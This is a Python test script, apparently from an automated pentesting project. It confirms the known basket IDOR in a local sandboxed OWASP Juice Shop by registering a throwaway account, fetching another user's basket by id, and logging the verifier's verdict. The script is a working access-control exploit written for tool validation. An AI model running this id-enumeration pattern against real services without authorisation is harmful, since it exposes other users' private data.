"""Phase 1 live check: a HAND-WRITTEN IDOR hypothesis against the real sandboxed
Juice Shop (no agent, no LangGraph) — proves the deterministic verifier returns a
correct, evidenced verdict against a running target (08_BUILD_ROADMAP.md, Phase 1).

Target: the canonical Juice Shop basket IDOR at GET /rest/basket/:id — the endpoint
does not enforce that the basket belongs to the caller, so an authenticated user can
read another user's basket.

Usage:  python scripts/run_idor_live.py [base_url]
        (default base_url = http://127.0.0.1:3000, the sandbox gateway)

Every request/response is logged to logs/{run_id}.jsonl per 05_SANDBOX_SETUP.md.
"""
from __future__ import annotations

import asyncio
import json
import sys
import uuid
from pathlib import Path

import httpx

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from schemas.models import Endpoint, Hypothesis, ParamSchema, Payload  # noqa: E402
from core.verifier import idor  # noqa: E402

BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:3000"
RUN_ID = f"idor-live-{uuid.uuid4().hex[:8]}"
LOG_PATH = Path(__file__).resolve().parents[1] / "logs" / f"{RUN_ID}.jsonl"


def _log_event(event: dict) -> None:
    LOG_PATH.parent.mkdir(parents=True, exist_ok=True)
    with LOG_PATH.open("a", encoding="utf-8") as fh:
        fh.write(json.dumps(event) + "\n")


async def _log_request(request: httpx.Request) -> None:
    _log_event({"dir": "request", "method": request.method, "url": str(request.url)})


async def _log_response(response: httpx.Response) -> None:
    await response.aread()
    body = response.text
    _log_event({
        "dir": "response",
        "url": str(response.request.url),
        "status": response.status_code,
        "body_truncated": body[:500],
    })


async def _register_and_login(client: httpx.AsyncClient) -> tuple[str, int]:
    """Register a fresh user and log in. Returns (jwt_token, own_basket_id)."""
    email = f"redteam+{uuid.uuid4().hex[:8]}@test.local"
    password = "Password123!"
    # Registration (securityQuestion id 1 exists in Juice Shop's seed data).
    reg = await client.post("/api/Users/", json={
        "email": email,
        "password": password,
        "passwordRepeat": password,
        "securityQuestion": {"id": 1},
        "securityAnswer": "test",
    })
    if reg.status_code not in (200, 201):
        raise RuntimeError(f"Registration failed: HTTP {reg.status_code} {reg.text[:200]}")

    login = await client.post("/rest/user/login", json={"email": email, "password": password})
    if login.status_code != 200:
        raise RuntimeError(f"Login failed: HTTP {login.status_code} {login.text[:200]}")
    auth = login.json()["authentication"]
    return auth["token"], int(auth["bid"])


def _build_hypothesis(token: str, own_bid: int, victim_bid: int) -> Hypothesis:
    endpoint = Endpoint(
        url=f"{BASE_URL}/rest/basket/:id",
        method="GET",
        params=[ParamSchema(name="id", location="path", type="int", sample_value=str(own_bid))],
        auth_required=True,
    )
    return Hypothesis(
        vuln_class="IDOR",
        endpoint=endpoint,
        rationale=(
            "GET /rest/basket/:id takes a numeric basket id and requires auth. If the "
            "endpoint omits an object-level ownership check, the caller's token can read "
            "a basket id that is not theirs — the textbook IDOR shape."
        ),
        payload=Payload(method="GET", url=f"{BASE_URL}/rest/basket/{victim_bid}", auth_token=token),
        success_criteria=(
            "A 200 response whose JSON matches the caller's own basket in structure but "
            "carries a different basket id / UserId — i.e. another user's basket."
        ),
    )


async def main() -> int:
    print(f"run_id   : {RUN_ID}")
    print(f"target   : {BASE_URL}")
    print(f"log file : {LOG_PATH}")

    async with httpx.AsyncClient(
        base_url=BASE_URL,
        timeout=30,
        event_hooks={"request": [_log_request], "response": [_log_response]},
    ) as client:
        token, own_bid = await _register_and_login(client)
        victim_bid = 1 if own_bid != 1 else 2
        print(f"own basket id   : {own_bid}")
        print(f"victim basket id: {victim_bid}")

        hypothesis = _build_hypothesis(token, own_bid, victim_bid)
        result = await idor.verify(hypothesis, client)

    print("\n=== VerificationResult ===")
    print(f"is_exploited : {result.is_exploited}")
    print(f"confidence   : {result.confidence}")
    print(f"status       : {result.evidence.raw_response_status}")
    print(f"notes        : {result.notes}")
    print(f"baseline body: {(result.evidence.baseline_response_body or '')[:160]}")
    print(f"attack body  : {(result.evidence.raw_response_body or '')[:160]}")

    ok = result.is_exploited and result.confidence == "deterministic"
    print("\nRESULT:", "PASS — deterministic IDOR confirmed against live sandbox" if ok
          else "did not confirm (see notes above)")
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(asyncio.run(main()))
